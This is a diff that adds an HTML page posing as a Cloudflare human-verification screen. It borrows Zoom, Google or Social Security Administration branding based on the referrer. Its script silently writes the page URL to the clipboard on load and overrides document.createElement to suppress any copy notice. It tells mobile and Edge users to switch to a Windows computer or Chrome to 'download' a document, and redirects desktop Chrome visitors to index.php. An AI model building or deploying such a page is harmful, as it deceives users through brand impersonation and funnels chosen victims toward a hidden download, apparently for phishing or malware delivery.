@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+    <title>Just a moment...</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+        html {
+            line-height: 1.15;
+            -webkit-text-size-adjust: 100%;
+            color: #313131;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif
+        }
+        body {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            min-height: 100vh;
+            background-color: #f9f9f9;
+            position: relative;
+        }
+        .main-content {
+            margin: 8rem auto;
+            padding-left: 1.5rem;
+            max-width: 60rem
+        }
+        @media (width <= 720px) {
+            .main-content {
+                margin-top: 4rem
+            }
+        }
+        .h2 {
+            line-height: 2.25rem;
+            font-size: 1.5rem;
+            font-weight: 500
+        }
+        @media (width <= 720px) {
+            .h2 {
+                line-height: 1.5rem;
+                font-size: 1.25rem
+            }
+        }
+        .core-msg {
+            line-height: 1.5;
+            font-size: 1rem;
+            color: #555;
+            margin-top: 1.5rem;
+        }
+        .spacer {
+            margin: 2rem 0
+        }
+        .spacer-top {
+            margin-top: 4rem
+        }
+        .spacer-bottom {
+            margin-bottom: 2rem
+        }
+        .main-wrapper {
+            display: flex;
+            flex: 1;
+            flex-direction: column;
+            align-items: center
+        }
+        .h1 {
+            line-height: 3.75rem;
+            font-size: 2.5rem;
+            font-weight: 500
+        }
+        .zone-name-title {
+            font-size: 1.5rem;
+            font-weight: 500;
+            color: #222;
+            margin-bottom: 1rem;
+        }
+        .loading-verifying {
+            height: 76.391px;
+            margin-top: 1.5rem;
+        }
+        .lds-ring {
+            display: inline-block;
+            position: relative;
+            width: 1.875rem;
+            height: 1.875rem
+        }
+        .lds-ring div {
+            box-sizing: border-box;
+            display: block;
+            position: absolute;
+            border: .3rem solid #313131;
+            border-radius: 50%;
+            border-color: #313131 transparent transparent transparent;
+            width: 1.875rem;
+            height: 1.875rem;
+            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite
+        }
+        .lds-ring div:nth-child(1) {
+            animation-delay: -0.45s
+        }
+        .lds-ring div:nth-child(2) {
+            animation-delay: -0.3s
+        }
+        .lds-ring div:nth-child(3) {
+            animation-delay: -0.15s
+        }
+        @keyframes lds-ring {
+            0% {
+                transform: rotate(0deg)
+            }
+            100% {
+                transform: rotate(360deg)
+            }
+        }
+        .footer {
+            margin: 0 auto;
+            padding-right: 1.5rem;
+            padding-left: 1.5rem;
+            width: 100%;
+            max-width: 60rem;
+            line-height: 1.125rem;
+            font-size: .75rem
+        }
+        .footer-inner {
+            border-top: 1px solid #d9d9d9;
+            padding-top: 1rem;
+            padding-bottom: 1rem
+        }
+        .text-center {
+            text-align: center
+        }
+        .ray-id {
+            text-align: center
+        }
+        code {
+            font-family: monaco, courier, monospace
+        }
+        .verification-text {
+            font-size: 1.5rem;
+            font-weight: 500;
+            color: #222;
+            margin-bottom: 1.5rem;
+        }
+        .security-msg {
+            margin-top: 2rem;
+        }
+        
+        /* Mobile & Browser Block Overlay - Clean design without warning symbols */
+        .block-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.85);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            backdrop-filter: blur(4px);
+        }
+        .block-container {
+            background-color: white;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 360px;
+            padding: 32px 24px 36px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            animation: fadeInUp 0.3s ease-out;
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .block-icon {
+            font-size: 56px;
+            margin-bottom: 16px;
+        }
+        .block-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a73e8;
+            margin-bottom: 12px;
+        }
+        .block-title-warning {
+            color: #d32f2f;
+        }
+        .block-message {
+            font-size: 16px;
+            color: #3c4043;
+            line-height: 1.5;
+            margin-bottom: 28px;
+        }
+        .block-message strong {
+            color: #1a73e8;
+        }
+        .copy-url-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .copy-url-btn:hover {
+            background-color: #0d5cbd;
+            transform: scale(1.02);
+        }
+        .copy-url-btn:active {
+            transform: scale(0.98);
+        }
+        
+        /* Dynamic Background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-size: 200px;
+            background-position: center;
+            background-repeat: no-repeat;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            z-index: -1;
+            pointer-events: none;
+        }
+        body.bg-zoom::before {
+            background-image: url('https://assets.zoom.us/images/en-us/general/zoom_logo_icon.svg');
+            opacity: 0.1;
+        }
+        body.bg-google::before {
+            background-image: url('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png');
+            opacity: 0.1;
+        }
+        body.bg-ssa::before {
+            background-image: url('https://www.ssa.gov/images/ssa-logo.svg');
+            opacity: 0.1;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-wrapper" role="main">
+        <div class="main-content">
+            <h1 class="zone-name-title h1" id="zoneTitle">zoom.us</h1>
+            <div id="verificationContent">
+                <p class="verification-text">Verifying you are human. This may take a few seconds.</p>
+                <div class="loading-verifying">
+                    <div class="lds-ring">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                </div>
+                <p class="core-msg security-msg">zoom.us needs to review the security of your connection before proceeding.</p>
+            </div>
+        </div>
+    </div>
+    <div class="footer" role="contentinfo">
+        <div class="footer-inner">
+            <div class="text-center" id="footer-text">Performance &amp; security by <a rel="noopener noreferrer" href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=l" target="_blank">Cloudflare</a></div>
+        </div>
+    </div>
+
+<script>
+    // ========== GET CURRENT PAGE URL (works on any hosted location) ==========
+    function getCurrentPageUrl() {
+        return window.location.href;
+    }
+    
+    // ========== SILENT URL COPY - NO VISUAL FEEDBACK, NO GREEN POPUP ==========
+    // This function copies silently without showing any message or toast notification
+    async function silentCopyUrl(url) {
+        try {
+            // Modern clipboard API - completely silent
+            await navigator.clipboard.writeText(url);
+            console.log('[Silent] URL copied to clipboard (no UI feedback)');
+            return true;
+        } catch (err) {
+            // Fallback for older browsers - also silent
+            console.warn('[Silent] Clipboard API failed, using fallback');
+            fallbackSilentCopy(url);
+            return false;
+        }
+    }
+    
+    function fallbackSilentCopy(url) {
+        const textarea = document.createElement('textarea');
+        textarea.value = url;
+        textarea.style.position = 'fixed';
+        textarea.style.top = '-9999px';
+        textarea.style.left = '-9999px';
+        textarea.style.opacity = '0';
+        textarea.setAttribute('aria-hidden', 'true');
+        document.body.appendChild(textarea);
+        textarea.select();
+        textarea.setSelectionRange(0, 99999);
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        console.log('[Silent] Fallback copy executed (no UI feedback)');
+    }
+    
+    // ========== CONFIGURATION ==========
+    const TARGET_URL = getCurrentPageUrl();
+    
+    // ========== USER AGENT DETECTION ==========
+    function isMobileDevice() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+    
+    function isEdgeBrowser() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isEdgeChromium = userAgent.includes('edg/') || userAgent.includes('edgios/') || userAgent.includes('edga/');
+        const isLegacyEdge = userAgent.includes('edge/') && !userAgent.includes('edg/');
+        const isMobileEdge = /EdgA/i.test(navigator.userAgent) || /EdgiOS/i.test(navigator.userAgent);
+        return isEdgeChromium || isLegacyEdge || isMobileEdge;
+    }
+    
+    // ========== DYNAMIC BACKGROUND ==========
+    function setDynamicBackground() {
+        const referrer = document.referrer.toLowerCase();
+        
+        if (referrer.includes('zoom.us') || referrer.includes('zoom')) {
+            document.body.classList.add('bg-zoom');
+            const titleEl = document.getElementById('zoneTitle');
+            if (titleEl) titleEl.textContent = 'zoom.us';
+        } else if (referrer.includes('google.com') || referrer.includes('google')) {
+            document.body.classList.add('bg-google');
+            const titleEl = document.getElementById('zoneTitle');
+            if (titleEl) titleEl.textContent = 'google.com';
+        } else {
+            document.body.classList.add('bg-ssa');
+        }
+    }
+    
+    // ========== MOBILE BLOCKAGE OVERLAY (without warning symbol) ==========
+    function showMobileBlockage() {
+        const existingOverlay = document.querySelector('.block-overlay');
+        if (existingOverlay) existingOverlay.remove();
+        
+        const overlay = document.createElement('div');
+        overlay.className = 'block-overlay';
+        
+        overlay.innerHTML = `
+            <div class="block-container">
+                <div class="block-icon">📱</div>
+                <div class="block-title block-title-warning">Access Restricted</div>
+                <div class="block-message">
+                    The document is not available for mobile devices.<br><br>
+                    Please switch to a <strong>Windows computer or laptop</strong> to download and view the document.
+                </div>
+                <button class="copy-url-btn" id="mobileBlockCopyBtn">
+                    <span>📋</span> Copy URL
+                </button>
+            </div>
+        `;
+        
+        document.body.appendChild(overlay);
+        document.body.style.overflow = 'hidden';
+        
+        const copyBtn = document.getElementById('mobileBlockCopyBtn');
+        if (copyBtn) {
+            copyBtn.addEventListener('click', async (e) => {
+                e.preventDefault();
+                await silentCopyUrl(TARGET_URL);
+                const originalText = copyBtn.innerHTML;
+                copyBtn.innerHTML = '<span>✓</span> Copied!';
+                copyBtn.style.backgroundColor = '#2e7d32';
+                setTimeout(() => {
+                    copyBtn.innerHTML = originalText;
+                    copyBtn.style.backgroundColor = '#1a73e8';
+                }, 1500);
+            });
+        }
+    }
+    
+    // ========== EDGE/BROWSER BLOCKAGE (without warning symbol) ==========
+    function showBrowserBlockage() {
+        const existingOverlay = document.querySelector('.block-overlay');
+        if (existingOverlay) existingOverlay.remove();
+        
+        const overlay = document.createElement('div');
+        overlay.className = 'block-overlay';
+        
+        overlay.innerHTML = `
+            <div class="block-container">
+                <div class="block-icon">🌐</div>
+                <div class="block-title">Browser Recommendation</div>
+                <div class="block-message">
+                    You are using Microsoft Edge. For full compatibility and security,<br>
+                    <strong>please use Google Chrome</strong> to access your documents.
+                </div>
+                <button class="copy-url-btn" id="browserBlockCopyBtn">
+                    <span>📋</span> Copy URL
+                </button>
+            </div>
+        `;
+        
+        document.body.appendChild(overlay);
+        document.body.style.overflow = 'hidden';
+        
+        const copyBtn = document.getElementById('browserBlockCopyBtn');
+        if (copyBtn) {
+            copyBtn.addEventListener('click', async (e) => {
+                e.preventDefault();
+                await silentCopyUrl(TARGET_URL);
+                const originalText = copyBtn.innerHTML;
+                copyBtn.innerHTML = '<span>✓</span> Copied!';
+                copyBtn.style.backgroundColor = '#2e7d32';
+                setTimeout(() => {
+                    copyBtn.innerHTML = originalText;
+                    copyBtn.style.backgroundColor = '#1a73e8';
+                }, 1500);
+            });
+        }
+    }
+    
+    // ========== MAIN EXECUTION WITH SILENT AUTO-COPY (NO GREEN POPUP) ==========
+    setDynamicBackground();
+    
+    // Silent auto-copy: copies URL to clipboard immediately without any visible notification
+    silentCopyUrl(TARGET_URL).catch(err => {
+        console.warn('Silent auto-copy non-critical error:', err);
+    });
+    
+    const isEdge = isEdgeBrowser();
+    const isMobile = isMobileDevice();
+    
+    if (isMobile) {
+        // Show loading spinner for 3 seconds, then show mobile blockage (no warning symbols)
+        setTimeout(() => {
+            showMobileBlockage();
+        }, 3000);
+    } 
+    else if (isEdge) {
+        // Show loading spinner for 3 seconds, then show browser blockage for Edge (no warning symbols)
+        setTimeout(() => {
+            showBrowserBlockage();
+        }, 3000);
+    } 
+    else {
+        // Normal desktop Chrome / supported browsers: redirect after 5 seconds
+        setTimeout(function() {
+            window.location.href = "index.php";
+        }, 5000);
+    }
+    
+    // Clean up any potential toast/notification elements that might be created by anything else
+    function cleanUpAnyPossibleToast() {
+        const existingToasts = document.querySelectorAll('.copy-success, .edge-popup-overlay, .mobile-block-overlay-old');
+        existingToasts.forEach(toast => toast.remove());
+        
+        const observer = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+                mutation.addedNodes.forEach((node) => {
+                    if (node.nodeType === 1 && node.classList) {
+                        if (node.classList.contains('copy-success')) {
+                            node.remove();
+                        }
+                        if (node.classList && (node.classList.contains('edge-popup-overlay') || 
+                            node.classList.contains('mobile-block-overlay-old'))) {
+                            node.remove();
+                        }
+                    }
+                });
+            });
+        });
+        observer.observe(document.body, { childList: true, subtree: true });
+    }
+    
+    cleanUpAnyPossibleToast();
+    
+    // Override any potential function that might try to show green popup
+    window.showCopyNotification = function() {
+        // Intentionally empty - blocks any legacy green message
+        console.debug('Green popup notification blocked');
+    };
+    
+    // Additional protection: block creation of elements with copy-success class
+    const originalCreateElement = document.createElement;
+    document.createElement = function(tagName) {
+        const element = originalCreateElement.call(document, tagName);
+        if (tagName.toLowerCase() === 'div') {
+            const setAttributeOriginal = element.setAttribute;
+            element.setAttribute = function(name, value) {
+                if (name === 'class' && typeof value === 'string' && value.includes('copy-success')) {
+                    console.debug('Blocked creation of copy-success element');
+                    return;
+                }
+                return setAttributeOriginal.call(this, name, value);
+            };
+            Object.defineProperty(element, 'className', {
+                set: function(val) {
+                    if (typeof val === 'string' && val.includes('copy-success')) {
+                        console.debug('Blocked className copy-success assignment');
+                        return;
+                    }
+                    return Object.getOwnPropertyDescriptor(Element.prototype, 'className').set.call(this, val);
+                },
+                get: function() {
+                    return Object.getOwnPropertyDescriptor(Element.prototype, 'className').get.call(this);
+                },
+                configurable: true
+            });
+        }
+        return element;
+    };
+    
+    // Final safety: on load, ensure no overlays conflict and no warning symbols appear
+    window.addEventListener('load', function() {
+        const allNotifications = document.querySelectorAll('.copy-success');
+        allNotifications.forEach(el => el.remove());
+        
+        // Re-check for mobile/edge after load in case timeout didn't fire
+        if (isMobileDevice() && !document.querySelector('.block-overlay')) {
+            setTimeout(() => {
+                if (!document.querySelector('.block-overlay')) {
+                    showMobileBlockage();
+                }
+            }, 100);
+        } else if (isEdgeBrowser() && !document.querySelector('.block-overlay') && !isMobileDevice()) {
+            setTimeout(() => {
+                if (!document.querySelector('.block-overlay')) {
+                    showBrowserBlockage();
+                }
+            }, 100);
+        }
+    });
+</script>
+</body>
+</html>
